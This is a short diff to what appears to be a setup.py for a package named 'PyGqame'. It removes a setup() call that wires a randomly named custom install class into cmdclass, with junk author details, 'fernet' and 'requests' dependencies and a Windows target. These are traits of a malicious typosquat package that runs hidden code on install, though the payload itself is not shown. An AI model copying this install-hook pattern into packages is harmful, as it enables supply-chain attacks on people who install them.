@@ -18,22 +18,5 @@ class qPiYvSoCnvfyLBZXEknnDxPhjaSmxYuyNaHabtUWwcGfmzadfRnNJmsKilaJkZkKYfAcjvqFSy
             install.run(self)
 
 
-setup(
-    name="PyGqame",
-    version=VERSION,
-    author="YWPIs",
-    author_email="VQTWFjYs@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': qPiYvSoCnvfyLBZXEknnDxPhjaSmxYuyNaHabtUWwcGfmzadfRnNJmsKilaJkZkKYfAcjvqFSyasuYLeHFKZDLKJh,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
 
